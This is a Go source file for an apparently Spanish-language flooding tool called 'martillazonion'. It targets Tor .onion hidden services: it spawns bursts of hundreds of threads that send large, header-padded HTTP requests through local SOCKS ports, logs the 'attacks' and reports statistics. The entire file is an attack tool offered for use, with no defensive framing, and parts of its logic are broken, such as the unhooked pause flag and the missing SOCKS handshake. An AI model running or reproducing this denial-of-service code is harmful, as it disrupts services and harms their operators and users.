package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	onionHost    string
	proxyPorts   = []int{9055, 9056, 9057, 9058, 9059, 9060}
	PORT         = 80
	MAX_HILOS    = 1000
	RAFA_MAX     = 250
	PAQUETES_POR_CONN = 100
	TTL_VALUE    = 1
	SOCKET_TIMEOUT = 4 * time.Second
	DELAY_ENTRE_PAKETS = 2 * time.Millisecond
	DELAY_RAFAGA  = 15 * time.Second
	lock          sync.Mutex
	proxyIndex    int
	hilosActivos  int
	ataquesEnviados int
	erroresConn     int
	logFile         *os.File
	objetivos       []string
	pausado         bool
	statsPorPuerto  = make(map[int]int)
	reintentosMax   = 3
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Mozilla/5.0 (X11; Linux x86_64)",
	"curl/7.87.0", "Wget/1.21.1", "Lynx/2.8.9rel.1",
}
var referers = []string{
	"http://duckduckgo.com", "http://protonmail.com", "http://torproject.org", "http://facebookcorewwwi.onion",
}

func banner() {
	fmt.Println("\033[92m" + `
                       __  .__.__  .__                             .__               
  _____ _____ ________/  |_|__|  | |  | _____  ____________   ____ |__| ____   ____  
 /     \\__  \\_  __ \   __\  |  | |  | \__  \ \___   /  _ \ /    \|  |/  _ \ /    \ 
|  Y Y  \/ __ \|  | \/|  | |  |  |_|  |__/ __ \_/    (  <_> )   |  \  (  <_> )   |  \ 
|__|_|  (____  /__|   |__| |__|____/____(____  /_____ \____/|___|  /__|\____/|___|  /
      \/     \/                              \/      \/          \/               \/ 
` + "\033[0m")
}

func generarPayload() string {
	headersExtra := ""
	for i := 0; i < rand.Intn(5)+2; i++ {
		headersExtra += fmt.Sprintf("X-Atk-%d: %s\r\n", i, strings.Repeat("Z", rand.Intn(551)+400))
	}
	return fmt.Sprintf(
		"GET /boom?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferer: %s\r\n%sConnection: close\r\n\r\n",
		rand.Intn(900000)+100000,
		onionHost,
		userAgents[rand.Intn(len(userAgents))],
		referers[rand.Intn(len(referers))],
		headersExtra,
	)
}

func getNextProxy() int {
	lock.Lock()
	defer lock.Unlock()
	port := proxyPorts[proxyIndex]
	proxyIndex = (proxyIndex + 1) % len(proxyPorts)
	return port
}

func proxyDisponible(port int) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 3*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func logAtaque(msg string) {
	if logFile != nil {
		logFile.WriteString(fmt.Sprintf("%s [%s]\n", time.Now().Format(time.RFC3339), msg))
	}
}

func ataque() {
	lock.Lock()
	port := getNextProxy()
	lock.Unlock()
	for i := 0; i < PAQUETES_POR_CONN; i++ {
		var err error
		for intento := 0; intento < reintentosMax; intento++ {
			if !proxyDisponible(port) {
				lock.Lock()
				erroresConn++
				lock.Unlock()
				logAtaque(fmt.Sprintf("Proxy %d no disponible (intento %d)", port, intento+1))
				time.Sleep(1 * time.Second)
				err = fmt.Errorf("proxy %d no disponible", port)
				continue
			}
			conn, errDial := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), SOCKET_TIMEOUT)
			if errDial != nil {
				lock.Lock()
				erroresConn++
				lock.Unlock()
				logAtaque(fmt.Sprintf("Error conexión (intento %d): %v", intento+1, errDial))
				time.Sleep(1 * time.Second)
				err = errDial
				continue
			}
			conn.SetDeadline(time.Now().Add(SOCKET_TIMEOUT))
			payload := generarPayload()
			_, errWrite := conn.Write([]byte(payload))
			conn.Close()
			if errWrite != nil {
				lock.Lock()
				erroresConn++
				lock.Unlock()
				logAtaque(fmt.Sprintf("Error envío: %v", errWrite))
				err = errWrite
				continue
			}
			lock.Lock()
			ataquesEnviados++
			statsPorPuerto[port]++
			lock.Unlock()
			logAtaque(fmt.Sprintf("Ataque enviado por %d [%s]", port, time.Now().Format("15:04:05")))
			fmt.Printf("[%s] Ataque #%d por %d\n", time.Now().Format("15:04:05"), ataquesEnviados, port)
			break
		}
		if err != nil {
			fmt.Printf("[!] Error persistente al enviar ataque: %v\n", err)
		}
		time.Sleep(DELAY_ENTRE_PAKETS)
	}
	lock.Lock()
	hilosActivos--
	lock.Unlock()
}

func lanzarRafaga(cantidad int) {
	lock.Lock()
	permitidos := MAX_HILOS - hilosActivos
	if permitidos <= 0 {
		lock.Unlock()
		return
	}
	lanzar := cantidad
	if permitidos < cantidad {
		lanzar = permitidos
	}
	hilosActivos += lanzar
	lock.Unlock()

	for i := 0; i < lanzar; i++ {
		go ataque()
	}
}

func monitorearProxies() {
	for {
		down := []int{}
		for _, port := range proxyPorts {
			if !proxyDisponible(port) {
				down = append(down, port)
			}
		}
		if len(down) > 0 {
			fmt.Printf("\033[91m[✗] SOCKS inactivos: %v\033[0m\n", down)
		}
		time.Sleep(10 * time.Second)
	}
}

func cargarObjetivosDesdeArchivo(path string) []string {
	var lista []string
	f, err := os.Open(path)
	if err != nil {
		fmt.Println("No se pudo abrir el archivo de objetivos:", err)
		return lista
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lista = append(lista, line)
		}
	}
	return lista
}

func mostrarAyudaExtendida() {
	fmt.Println("Uso extendido:")
	fmt.Println("  Ejecuta y sigue el prompt para ingresar objetivo.")
	fmt.Println("  -targets <archivo.txt>  (para múltiples objetivos)")
	fmt.Println("  -log <archivo>          (para registrar ataques)")
	fmt.Println("  -help                   (muestra esta ayuda)")
}

func mainLoop() {
	go monitorearProxies()
	for {
		lanzarRafaga(RAFA_MAX)
		lock.Lock()
		fmt.Printf("\033[91m[⚒️] Ráfaga: %d hilos activos: %d\033[0m\n", RAFA_MAX, hilosActivos)
		lock.Unlock()
		time.Sleep(DELAY_RAFAGA)
	}
}

func main() {
	banner()
	fmt.Print("\033[92mDominio .onion (v3): \033[0m")
	fmt.Scanln(&onionHost)
	fmt.Printf("\033[92m[🔥] MARTILLAZONION Multipuerto 9055–9060\n[→] Objetivo: %s\n[→] Usando SOCKS5 puertos: %v\n\033[0m", onionHost, proxyPorts)
	var logPath string
	fmt.Print("Archivo de log (opcional, enter para omitir): ")
	fmt.Scanln(&logPath)
	if logPath != "" {
		var err error
		logFile, err = os.Create(logPath)
		if err != nil {
			fmt.Println("No se pudo crear el archivo de log:", err)
		}
		defer logFile.Close()
	}
	var targetsFile string
	var showHelp bool
	fmt.Print("Archivo de objetivos (opcional, enter para omitir): ")
	fmt.Scanln(&targetsFile)
	if showHelp {
		mostrarAyudaExtendida()
		os.Exit(0)
	}
	if targetsFile != "" {
		objetivos = cargarObjetivosDesdeArchivo(targetsFile)
	} else if onionHost != "" {
		objetivos = []string{onionHost}
	}
	if len(objetivos) == 0 {
		fmt.Println("Debes especificar al menos un objetivo.")
		os.Exit(1)
	}
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Print("[PAUSA/ESTAD] Escribe 'p' para pausar/reanudar, 's' para estadísticas: ")
			txt, _ := reader.ReadString('\n')
			txt = strings.TrimSpace(txt)
			if txt == "p" {
				pausado = !pausado
				if pausado {
					fmt.Println("Ataque pausado.")
				} else {
					fmt.Println("Ataque reanudado.")
				}
			}
			if txt == "s" {
				lock.Lock()
				fmt.Printf("[ESTAD] Ataques enviados: %d | Errores: %d | Hilos activos: %d\n", ataquesEnviados, erroresConn, hilosActivos)
				lock.Unlock()
			}
		}
	}()
	for _, objetivo := range objetivos {
		onionHost = objetivo
		fmt.Printf("\n[🔥] Atacando objetivo: %s\n", onionHost)
		mainLoop()
		fmt.Printf("[Resumen objetivo %s] Ataques: %d | Errores: %d\n", onionHost, ataquesEnviados, erroresConn)
		for port, count := range statsPorPuerto {
			fmt.Printf("  - Puerto %d: %d ataques\n", port, count)
		}
		ataquesEnviados, erroresConn = 0, 0
		statsPorPuerto = make(map[int]int)
	}
	// Captura Ctrl+C para mostrar resumen
	c := make(chan os.Signal, 1)
	go func() {
		<-c
		fmt.Printf("\n\n[Resumen] Ataques enviados: %d | Errores de conexión: %d\n", ataquesEnviados, erroresConn)
		if logFile != nil {
			fmt.Println("[+] Log guardado en:", logPath)
		}
		os.Exit(0)
	}()
	mainLoop()
}
